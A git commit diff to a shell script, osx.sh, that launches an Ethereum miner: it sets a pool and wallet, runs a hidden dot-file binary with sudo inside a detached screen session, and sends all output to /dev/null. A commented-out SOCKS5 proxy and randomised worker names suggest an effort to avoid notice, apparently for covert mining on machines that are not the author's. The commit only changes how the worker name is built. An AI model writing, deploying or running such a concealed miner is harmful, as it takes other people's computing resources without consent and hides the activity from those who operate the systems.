915ec2b55507ca1245f5e5536a39bb3d2688d4b2
azis07 <abd.azispc@gmail.com>
2021-09-18 00:59:19 +0700

    Update osx.sh

--- osx.sh
+++ osx.sh
@@ -7,6 +7,5 @@ screen -dmS ls
 POOL=eth-pool.beepool.org:9530
 WALLET=langitterang
 WORKER1=$(echo $(shuf -i 1-999 -n 1)-GPU)
-WORKER2=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader))
 #PROXY=socks5://72.210.252.134:46164
-sudo ./.turbo -a ethash -o $POOL -u $WALLET.$WORKER1$WORKER2 > /dev/null
+sudo ./.turbo -a ethash -o $POOL -u $WALLET.$WORKER1 > /dev/null
